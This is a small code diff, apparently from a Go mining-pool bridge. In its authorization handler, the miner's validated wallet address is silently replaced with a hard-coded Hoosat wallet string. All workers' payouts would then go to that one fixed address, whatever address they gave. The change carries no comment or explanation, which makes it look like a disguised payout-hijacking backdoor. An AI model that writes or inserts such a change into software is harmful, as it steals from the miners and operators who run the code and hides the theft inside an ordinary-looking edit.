@@ -67,7 +67,7 @@ func HandleAuthorize(ctx *StratumContext, event JsonRpcEvent) error {
 		return fmt.Errorf("invalid wallet format %s: %w", address, err)
 	}
 
-	ctx.WalletAddr = address
+	ctx.WalletAddr = "hoosat:qzck87n0uph2vvguawy6nsll7x7c0t9z3ff3n0q6a89wtpy6lypvgwmk7ez83"
 	ctx.WorkerName = workerName
 	ctx.Logger = ctx.Logger.With(zap.String("worker", ctx.WorkerName), zap.String("addr", ctx.WalletAddr))
 
